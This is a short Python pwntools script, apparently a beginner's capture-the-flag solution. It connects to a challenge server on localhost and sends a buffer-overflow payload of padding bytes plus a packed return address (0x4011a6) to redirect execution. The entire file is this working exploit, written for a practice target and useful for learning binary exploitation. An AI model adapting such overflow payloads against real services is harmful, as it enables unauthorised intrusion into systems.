# First hacker man script yay!
from pwn import *

conn = remote("localhost", "1337") # Connects to the server that's hosting the challenge..

payload = b'AAAAAAsAABAAAAAnAACAAAAAAAAAAAAAAAAAEAAa' # Padding ...
payload += p64(0x4011a6)                              # p64 packs the address so that it's intepreted as the address 
                                                      # we want in the assembly

print(conn.clean())                                   # Just print whatever outputted to terminal
conn.sendline(payload)                                # Send our payload!

text = conn.clean()                                   # What output did we get?
print(text.decode())                                  # Print it back to us!

conn.close()                                          # Close and finish

